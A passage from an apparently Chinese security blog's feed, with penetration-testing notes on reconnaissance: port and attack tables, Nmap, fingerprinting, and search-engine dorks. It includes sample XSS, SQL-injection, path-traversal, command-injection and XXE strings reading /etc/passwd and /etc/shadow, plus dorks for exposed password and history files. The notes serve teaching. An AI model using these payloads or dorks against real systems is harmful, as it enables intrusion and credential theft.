href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></p></li><li><p><strong><a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></strong></p></li><li><p><strong>Google语法  site:xxx.com</strong></p></li><li><p><strong><a href="https://crt.sh/">证书透明度公开曰志枚举</a></strong></p></li></ul><h4 id="IP相关信息"><a href="#IP相关信息" class="headerlink" title="IP相关信息"></a>IP相关信息</h4><ul><li><p><strong><a href="http://ip.chinaz.com/">IP查询</a></strong></p></li><li><p><strong><a href="https://ip.chinaz.com/linksip">同IP查询</a></strong></p></li><li><p><strong><a href="https://www.maxmind.com/en/home">IP经纬度</a></strong></p></li></ul><h4 id="端口服务相关信息"><a href="#端口服务相关信息" class="headerlink" title="端口服务相关信息"></a>端口服务相关信息</h4><p>查看本机端口</p><p>Windows：netstat -aon|findstr 3306</p><p>Linux: netstat -an|grep 3306 </p><p>远程机器端口</p><p>telnet 192.168.142.137 80 </p><p>wget 192.168.142.137 80 </p><p>nc -vz 192.168.142.137 445</p><h5 id="常见端口及漏洞"><a href="#常见端口及漏洞" class="headerlink" title="常见端口及漏洞"></a>常见端口及漏洞</h5><h6 id="文件共享服务"><a href="#文件共享服务" class="headerlink" title="文件共享服务"></a>文件共享服务</h6><table><thead><tr><th align="center">端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td align="center">21&#x2F;22&#x2F;69</td><td>FTP&#x2F;SFTP文件传输协议</td><td>允许匿名上传、下载、爆破和嗅探操作</td></tr><tr><td align="center">2049</td><td>NFS服务（NetworkFileSystem）</td><td>配置不当</td></tr><tr><td align="center">139</td><td>Samba服务</td><td>爆破、未授权访问、远程代码和执行</td></tr><tr><td align="center">389</td><td>LDAP目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><h6 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h6><table><thead><tr><th align="center">端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td align="center">22</td><td>SSH远程连接</td><td>爆破、SSH隧道及内网代理转发 文件传输</td></tr><tr><td align="center">23</td><td>Telnet远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td align="center">3389</td><td>RDP远程桌面连接</td><td>Shift后门（WindowsServer2003以下的系统）、爆破</td></tr><tr><td align="center">5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td align="center">5632</td><td>PcAnywhere远程控制服务</td><td>抓密码、代码执行</td></tr></tbody></table><h6 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL数据库</td><td>注入、提权、SA弱口令</td></tr><tr><td>1521</td><td>Oracle数据库</td><td>TNS爆破、注入、反弹shell</td></tr><tr><td>5432</td><td>PostgreSQL数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis数据库</td><td>可尝试未授权访问、弱口令爆破</td></tr><tr><td>5000</td><td>Sysbase&#x2F;DB2数据库</td><td>爆破、注入</td></tr></tbody></table><h6 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP协议</td><td>爆破</td></tr></tbody></table><h6 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS劫持  缓存投毒、欺骗</td></tr><tr><td>67&#x2F;68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h6 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h6><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击方向</th></tr></thead><tbody><tr><td>2181</td><td>Zookeeper服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix服务</td><td>远程执行、SQL注入</td></tr><tr><td>9200&#x2F;9300</td><td>Elasticsearch服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memcached服务</td><td>未授权访问</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>LinuxRexec服务</td><td>爆破、rlogin登录</td></tr><tr><td>873</td><td>Rsync服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN服务</td><td>SVN泄露、未授权访问</td></tr><tr><td>50000</td><td>SAPManagementConsole</td><td>远程执行</td></tr></tbody></table><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>Nmap （Network Mapper <a href="https://nmap.org/">https://nmap.org/</a></p><p>1）扫描主机(HostiDiscovery)</p><p>2）扫描端口(Port Scanning）</p><p>3）探测操作系统、软件版本（Operating System Detection、Version Detection)</p><p>参数类型</p><p>nmap–help</p><ul><li><p>TARGETSPECIFICATIOM:自标，对什么进行扫描，比如是域名、TP或者网络</p></li><li><p>HOSTDISCOVERY:主机发现，怎么对主机进行扫描，比如简单扫描，还是全部，扫一遍，或者用相应的协议扫</p></li><li><p>SCANTECHNIOQUES：扫描技术，协议日勺设置</p></li><li><p>PORTSPECIFICATIONANDSCANORDER:端口和扫描顺序设置 SERVICEVERSIONDETECTION:服务和版本识别</p></li><li><p>SCRIPT SCAN:使用脚本，nmap本身内置了大量的lua脚本，而且还可以自己编写脚本</p></li><li><p>OS DETECTION:操作系统识别</p></li><li><p>TIMING AND PERFORMANCE:时间和性能设置，比如扫描频率、重试次数等等 FIREWALL&#x2F;IDS EVASION AND SPOOFING:防火墙绕过和欺骗，比如使用代理假IP等</p></li><li><p>OUTPUT:把扫描接出输出到文件 MISC：启用IPv6等等配置</p></li></ul><p>nmap本身内置了大量的lua脚本，而且还可以自己已编写脚本 </p><p>Is &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; I wc -1</p><p>全部清单：<a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a></p><p>例如：</p><p>nmap 192.168.142.137 –script http-enum 列举HTTP服务</p><p>nmap–script&#x3D;auth绕过鉴权 </p><p>nmap–script&#x3D;brute 暴力破解 nmap –script&#x3D;vuln 扫描漏洞</p><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p><strong>识别对象</strong></p><ol><li>CMS信息：比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等</li><li>前端技术：比如HTML5、jquery、bootstrap、Vue、ace等;</li><li>开发语言：比如PHP、Java、Ruby、Python、C#等;</li><li>Web服务器：比如Apache、 Nginx、IIS、lighttpd等;</li><li>应用服务器：比如Tomcat、Jboss、Weblogic、Websphere等;</li><li>操作系统信息：比如Linux、win2k8、win7、Kali、Centos等;</li><li>CDN信息：是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；</li><li>WAF信息：是否使用WAF，如D盾、云锁、宝塔、安全狗、360等</li></ol><h5 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h5><p>内容管理系统</p><p>Content Management System</p><p>通过关键特征器、开发语言、版本等等</p><p>识别出月标的CMS系统、服务操作系统、CDN、WAF的类别</p><h6 id="常见的CMS"><a href="#常见的CMS" class="headerlink" title="常见的CMS"></a><strong>常见的CMS</strong></h6><p>博客（比如CSDN、博客园）、微博、站、导航网站（hao123）、信息分类（知乎）、商城、百科…．　</p><p>问答网站、企业官网、学校官网、医院官网、团购网(58）</p><p><img src="CMS.png" loading="lazy"></p><h6 id="各类网站开源CMS"><a href="#各类网站开源CMS" class="headerlink" title="各类网站开源CMS"></a><strong>各类网站开源CMS</strong></h6><ul><li>企业建站系统：Metlnfo(米拓)、蝉知、SiteServer CMS等;</li><li>B2C商城系统：商派Shopex、ECshop、HiShop、XpShop等</li><li>门户建站系统：DedeCMS(织梦)、帝国CMS、PHPCMS、动易CmsTop等;</li><li>博客系统：WordPress、Z-Blog等</li><li>论坛社区：Discuz、PHPwind、WeCenter等</li><li>问答系统：Tipask、whatsns等</li><li>知识百科系统：HDwiki;</li><li>B2B门户系统：Destoon、B2Bbuilder、友邻B2B等</li><li>人才招聘网站系统：骑士CMS、PHP云人才管理系统</li><li>房产网站系统：FangCms等;</li><li>在线教育建站系统：Kesion、EduSoho;</li><li>电影网站系统：苹果cMS、ctcms、movcms等</li><li>小说文学建站系统：杰奇CMS</li></ul><h6 id="CMS指纹识别思路"><a href="#CMS指纹识别思路" class="headerlink" title="CMS指纹识别思路"></a>CMS指纹识别思路</h6><p>版权信息、特定文件MD5值、查看网页源代码、通过特定文件分析</p><h6 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h6><ul><li>whatweb(kali)</li><li>浏览器插件</li><li><ul><li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li><li><a href="https://www.whatruns.com/">whatruns</a></li></ul></li><li>在线网站</li><li><ul><li><a href="http://finger.tidesec.com/">潮汐指纹识别</a></li></ul></li><li>离线网站</li><li><ul><li>御剑指纹扫描器(需要.NET Framework）</li><li>Test404轻量CMS指纹识别v2.1</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeek</a></li></ul></li></ul><h5 id="CDN指纹识别"><a href="#CDN指纹识别" class="headerlink" title="CDN指纹识别"></a>CDN指纹识别</h5><ul><li>(超级)ping</li><li>nslookup</li><li>ldb(load balance detector  Kali)</li><li>国内：</li><li><ul><li><a href="http://cdn.chinaz.com/">各地CDN节点测速结果 - CDN云观测 - 站长工具</a></li></ul></li><li>国外：</li><li><ul><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></li></ul></li><li>脚本：</li><li><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">w8Fuckcdn</a> </li><li><a href="https://github.com/3xp10it/xcdn">xcdn</a></li></ul></li></ul><h5 id="WAF指纹识别"><a href="#WAF指纹识别" class="headerlink" title="WAF指纹识别"></a>WAF指纹识别</h5><p>Web. Application Firewall Web 应用防火墙</p><p>过滤HTTP&#x2F;HTTPS的请求</p><h6 id="WAF的作用"><a href="#WAF的作用" class="headerlink" title="WAF的作用"></a>WAF的作用</h6><ul><li><p>SQL Injection (SQLi)：阻止SQL注入</p></li><li><p>Cross Site Scripting (XSS)：阻止跨站脚本攻击</p></li><li><p>Local File Inclusion (LFI)： 阻正止利用本地文件包含漏洞进行攻击</p></li><li><p>Remote File Inclusione(RFl)：阻止利用远程文件包含漏洞进行攻击</p></li><li><p>Remote Code Execution(RCE)：阻正止利用远程命令执行漏洞进行攻击 PHP Code Injectiod：阻正止PHP代码注入</p></li><li><p>HTTP Protocol Violations：阻止违反HTTP协议的恶意访问</p></li><li><p>HTTPoXy：阻止利用远程代理感染漏洞进行攻击 Sshllshock：阻止利用Shellshock漏洞进行攻击</p></li><li><p>Session Fixation： 阻止利用Session会话iD不变的漏洞进行攻击 ScannerDetection：阻止黑客扫描网站</p></li><li><p>Metadata&#x2F;ErrorLeakages：阻止源代码&#x2F;错误信息泄露 Project Honey Pot Blacklist：蜜罐项目黑名单</p></li><li><p>GeolP Country Blocking：根据判断IP地址归属地来进行IP阻断</p></li></ul><h6 id="WAF分类"><a href="#WAF分类" class="headerlink" title="WAF分类"></a>WAF分类</h6><p>硬件型WAF厂商安装）</p><p>云WAF（阿里云、腾讯云、华为云.. ）</p><p>软件型 WAF（部署在 Apache、Nginx 等 HTTPServer中）</p><h6 id="常见WAF厂商"><a href="#常见WAF厂商" class="headerlink" title="常见WAF厂商"></a>常见WAF厂商</h6><p>各种云：阿里云、腾讯云、华为云、百度云</p><p>安全狗、宝塔、360、知道创宇、长亭、安恒、</p><h6 id="WAF识别思路"><a href="#WAF识别思路" class="headerlink" title="WAF识别思路"></a>WAF识别思路</h6><ul><li><p>额外的cookie;</p></li><li><p>任何响应或请求的附加标头;</p></li><li><p>响应内容（如果被阻止请求）</p></li><li><p>响应代码（如果被阻止请求）</p></li><li><p>IP地址（云WAF）；</p></li><li><p>JS客户端模块（客户端WAF）</p></li></ul><h6 id="WAF触发拦截方式"><a href="#WAF触发拦截方式" class="headerlink" title="WAF触发拦截方式"></a>WAF触发拦截方式</h6><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xsstring <span class="token operator">=</span> '<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">sqlistring &#x3D; &quot;UNION SELECT ALL FROM information schema AND &#39; or SLEEP(5) or &#39;&quot;</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">Ifistring <span class="token operator">=</span> "<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/./<span class="token punctuation">..</span>/etc/passwd</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xxestring <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">ENTITY</span> xxe <span class="token constant">SYSTEM</span> <span class="token string">"file:///etc/shadow"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>pwn<span class="token operator">></span><span class="token operator">&amp;</span>hack<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pwn<span class="token operator">></span>"</code></pre><h6 id="WAF识别工具"><a href="#WAF识别工具" class="headerlink" title="WAF识别工具"></a>WAF识别工具</h6><p>Kali自带：</p><ul><li><p><a href="https://github.com/EnableSecurity/wafwOOf">wafwOOf</a> </p></li><li><p>wafw00f <a href="https://www.12306.cn/">https://www.12306.cn</a></p></li><li><p>nmap <a href="http://www.12306.cn/">www.12306.cn</a> –script&#x3D;http-waf-detect.nse</p></li><li><p>sqlmap -u “xxx.com?id&#x3D;1” –identify-waf</p></li></ul><p>其他：</p><ul><li><a href="https://github.com/Oxlnfection/Awesome-WAF">Build software better, together</a></li></ul><h5 id="搜索引擎-Google语法"><a href="#搜索引擎-Google语法" class="headerlink" title="搜索引擎(Google语法)"></a>搜索引擎(Google语法)</h5><p>查找正文含有关键字的网页</p><h6 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intext</span><span class="token punctuation">:</span>后台登陆      只返回正文包含“后台登陆”的网页</code></pre><h6 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">intitle</span><span class="token punctuation">:</span>后台登陆           只返回标题中包含“后台登录”的网页</code></pre><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">allintitle</span><span class="token punctuation">:</span>后台登陆 管理员       可以指定多个词</code></pre><h6 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h6><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>login</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>admin<span class="token operator">/</span>login<span class="token punctuation">.</span>php      查找管理员登陆页面<span class="token literal-property property">inurl</span><span class="token operator">:</span><span class="token operator">/</span>phpmyadmin<span class="token operator">/</span>index<span class="token punctuation">.</span>php  查找后台数据库管理员页面<span class="token literal-property property">allinurl</span><span class="token operator">:</span>                  可以指定多个词</code></pre><h6 id="site"><a href="#site" class="headerlink" title="site"></a>site</h6><pre class="language-mipsasm" data-language="mipsasm"><code class="language-mipsasm">site:baidu.com inurl:login         只在baidu.com 中查找url中含有 Login的网页</code></pre><h6 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h6><p>指定访问的文件类型</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">site</span><span class="token punctuation">:</span>xcu.edu.cn filetype<span class="token punctuation">:</span>pdf</code></pre><h6 id="link"><a href="#link" class="headerlink" title="link"></a>link</h6><p>指定连接的网页</p><pre class="language-bash" data-language="bash"><code class="language-bash">link:www.baidu.com </code></pre><h6 id="related"><a href="#related" class="headerlink" title="related"></a>related</h6><p>相似类型的网页</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">related</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h6><p>返回浏览器对网站的缓存</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">cache</span><span class="token punctuation">:</span>www.xcu.edu.cn</code></pre><h6 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h6><p>返回站点的指定信息</p><h6 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h6><p>返回某个词语的定义</p><h6 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook:"></a>phonebook:</h6><p>电话簿查询美国街道地址和电话号码信息</p><h6 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h6><ul><li>site:xx.com intext:管理</li><li>site:xx.com inurl:login</li><li>site:xx.com intitle:后台</li></ul><h6 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h6><ul><li>site:xx.com filetype:asp</li><li>site:xx.com filetype:php</li><li>site:xx.com filetype:jsp</li><li>site:xx.com filetype:aspx</li></ul><h6 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h6><ul><li>site:xx.com inurl:file</li><li>site:xx.com inurl:load</li></ul><h6 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h6><p>利用 Index of 语法去发现允许目录浏览的web网站，就像在本地的普通目录一样</p><pre class="language-bash" data-language="bash"><code class="language-bash">index of /adminindex of /passwdindex of /passwordindex of /mail<span class="token string">"index of /"</span> +passwd<span class="token string">"index of /"</span> +password.txt<span class="token string">"index of /"</span>.htaccess<span class="token string">"index of /root"</span><span class="token string">"index of/cgi-bin"</span><span class="token string">"index of/logs"</span><span class="token string">"index of /config"</span></code></pre><p>inurl</p><p>而上面这些命令中用的最多的就是 inurl: 了，利用这个命令，可以查到很多意想不到的东西</p><pre class="language-bash" data-language="bash"><code class="language-bash">利用 allinurl:winnt/system32/ 查询：列出的服务器上本来应该受限制的诸如“system32” 等目录，如果你运气足够好，你会发现“system32” 目录里的“cmd.exe” 文件，并能执行他，接下来就是提升权限并攻克了。查询 allinurl:wwwboard/passwd.txt  将列出所有有“WWWBoard Password vulnerability”漏洞的服务器查询  inurl:.bash_history  将列出互联网上可以看见 “inurl:.bash_history” 文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。查询 inurl:config.txt  将看见网上暴露了“inurl:config.txt”文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</code></pre><p>还有一些其他一些使用“inurl:”和“allinurl:”查询组合的例子</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>db<span class="token target symbol">inurl</span><span class="token punctuation">:</span>admin filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>mysql filetype<span class="token punctuation">:</span>cfg<span class="token target symbol">inurl</span><span class="token punctuation">:</span>passwd filetype<span class="token punctuation">:</span>txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>”wwwroot/*.”<span class="token target symbol">inurl</span><span class="token punctuation">:</span>adpassword.txt<span class="token target symbol">inurl</span><span class="token punctuation">:</span>webeditor.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>file_upload.php<span class="token target symbol">inurl</span><span class="token punctuation">:</span>gov filetype<span class="token punctuation">:</span>xls “restricted”<span class="token target symbol">index of ftp +.mdb allinurl</span><span class="token punctuation">:</span>/cgi-bin/ +mailto</code></pre><h6 id="语法数据库-工具"><a href="#语法数据库-工具" class="headerlink" title="语法数据库&amp;工具"></a>语法数据库&amp;工具</h6><p><a href="https://www.exploit-db.com/googlehacking-database">Google Hacking Database</a></p><p>[Google Dork List](<a href="https://github.com/BullsEye0/google_dork">https://github.com/BullsEye0/google_dork</a>_<br>list)</p><p><a href="https://github.com/opsdisk/pagodo">pagodo - Passive Google Dork</a></p><h5 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h5><h6 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><a href="https://www.shodan.io/">shodan</a></h6><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索</p><p>网络类</p><pre class="language-bash" data-language="bash"><code class="language-bash">port          端口  product     所使用的软件或产品os          操作系统类型version：    搜索指定的软件版本，例如 version:<span class="token string">"1.3.2"</span>net：搜索指定的IP地址或子网，例如 net:<span class="token string">"110.43.140.0/24"</span></code></pre><p>应用类</p><pre class="language-bash" data-language="bash"><code class="language-bash">html.title  网页标题http.html   网页内容http.server http请求返回中server的类型http.status http请求返回响应码的状态<span class="token function">hostname</span>  主机类型http.favicon.hash icon对应hashvuln       CVE漏洞编号，例如：vuln：CVE-2014-0723</code></pre><p>地理位置类</p><pre class="language-bash" data-language="bash"><code class="language-bash">country：搜索指定的国家，例如 country:<span class="token string">"CN"</span>city：搜索指定的城市，例如 city:<span class="token string">"Beijing"</span>org：搜索指定的组织或公司，例如 org:<span class="token string">"google"</span>isp：搜索指定的ISP供应商，例如 isp:<span class="token string">"China Telecom"</span></code></pre><p>其他<br>如果需要多个词同时搜索时，只需要在每个关键字间加空格分割就行，比如：country:“CN” city:“Beijing”<br>当不需要某个词时，可以用”-”加上关键词来进行去除。比如：”-port:80”（排除80端口搜索结果）<br><a href="https://github.com/random-robbie/My-Shodan-Scripts">My-Shodan-Scripts</a></p><h6 id="censys"><a href="#censys" class="headerlink" title="censys"></a><a href="https://search.censys.io/">censys</a></h6><ul><li>23.0.0.0&#x2F;8 or 8.8.8.0&#x2F;24　　可以使用and or not</li><li>80.http.get.status_code: 200　　指定状态</li><li>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</li><li>location.country_code: DE　　国家</li><li>protocols: (“23&#x2F;telnet” or “21&#x2F;ftp”)　　协议</li><li>tags: scada　　标签</li><li>80.http.get.headers.server：nginx　　服务器类型版本</li><li>autonomous_system.description: University　　系统描述</li><li>正则</li></ul><h6 id="钟馗之眼ZoomEye"><a href="#钟馗之眼ZoomEye" class="headerlink" title="钟馗之眼ZoomEye"></a><a href="https://www.zoomeye.org/">钟馗之眼ZoomEye</a></h6><p>钟馗之眼搜索引擎偏向web应用层面的搜索。</p><ul><li>app:nginx　　组件名</li><li>ver:1.0　　版本</li><li>os:windows　　操作系统</li><li>country:”China”　　国家</li><li>city:”hangzhou”　　城市</li><li>port:80　　端口</li><li>hostname:google　　主机名</li><li>site:thief.one　　网站域名</li><li>desc:nmask　　描述</li><li>keywords:nmask’blog　　关键词</li><li>service:ftp　　服务类型</li><li>ip:8.8.8.8　　ip地址</li><li>cidr:8.8.8.8&#x2F;24　　ip地址段</li></ul><h6 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a><a href="https://fofa.info/">FoFa</a></h6><p>FoFa搜索引擎偏向资产搜索。</p><p>搜索语法</p><ul><li>title&#x3D;”abc” 从标题中搜索abc。例：标题中有北京的网站。</li><li>header&#x3D;”abc” 从http头中搜索abc。例：jboss服务器。</li><li>body&#x3D;”abc” 从html正文中搜索abc。例：正文包含Hacked by。</li><li>domain&#x3D;”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</li><li>host&#x3D;”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</li><li>port&#x3D;”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</li><li>ip&#x3D;”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</li><li>protocol&#x3D;”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</li><li>city&#x3D;”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</li><li>region&#x3D;”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</li><li>country&#x3D;”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</li><li>cert&#x3D;”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</li></ul><p>高级搜索：</p><ul><li>title&#x3D;”powered by” &amp;&amp; title!&#x3D;discuz</li><li>title!&#x3D;”powered by” &amp;&amp; body&#x3D;discuz</li><li>( body&#x3D;”content&#x3D;\”WordPress” || (header&#x3D;”X-Pingback” &amp;&amp; header&#x3D;”&#x2F;xmlrpc.php” &amp;&amp; body&#x3D;”&#x2F;wp-includes&#x2F;“) ) &amp;&amp; host&#x3D;”gov.cn”</li></ul><h6 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a><a href="https://www.dnsdb.io/">Dnsdb搜索引擎</a></h6><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。</p><p>搜索语法</p><p>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p><p>域名查询条件</p><p>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</p><p>主机查询条件</p><p>查询语法:host:<br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p><p>按DNS记录类型查询</p><p>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p><p>按IP限制</p><p>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0&#x2F;24<br>IP最大范围限制65536个</p><p>条件组合查询的例子</p><p>查询google.com的所有A记录: google.com type:a</p><h6 id="Apollo"><a href="#Apollo" class="headerlink" title="Apollo"></a><a href="https://github.com/b0bac/ApolloScanner">Apollo</a></h6><h6 id="EHole"><a href="#EHole" class="headerlink" title="EHole"></a><a href="https://github.com/EdgeSecurityTeam/EHole">EHole</a></h6><h6 id="ShuiZe"><a href="#ShuiZe" class="headerlink" title="ShuiZe"></a><a href="https://github.com/0x727/ShuiZe_0x727">ShuiZe</a></h6><h6 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a><a href="https://github.com/knownsec/Kunyu">Kunyu</a></h6><h6 id="Saucerframe"><a href="#Saucerframe" class="headerlink" title="Saucerframe"></a><a href="https://github.com/saucer-man/saucerframe">Saucerframe</a></h6>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-sqli</title>
      <link href="/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/"/>
      <url>/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><h5 id="1-SQL注入概念及产生原因："><a href="#1-SQL注入概念及产生原因：" class="headerlink" title="1.SQL注入概念及产生原因："></a>1.SQL注入概念及产生原因：</h5><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊</p><p>的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><h5 id="2-SQL注入的本质："><a href="#2-SQL注入的本质：" class="headerlink" title="2.SQL注入的本质："></a>2.SQL注入的本质：</h5><p>把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p><h5 id="3-SQL注入的两个关键点："><a href="#3-SQL注入的两个关键点：" class="headerlink" title="3.SQL注入的两个关键点："></a>3.SQL注入的两个关键点：</h5><p>1.用户能控制输入的内容； </p><p>2.web应用把用户输入的内容带入到数据库执行；</p><h5 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h5><p>1.盗取网站的敏感信息;</p><p>2.绕过网站后台认证 后台登录语句： </p><pre class="language-mysql" data-language="mysql"><code 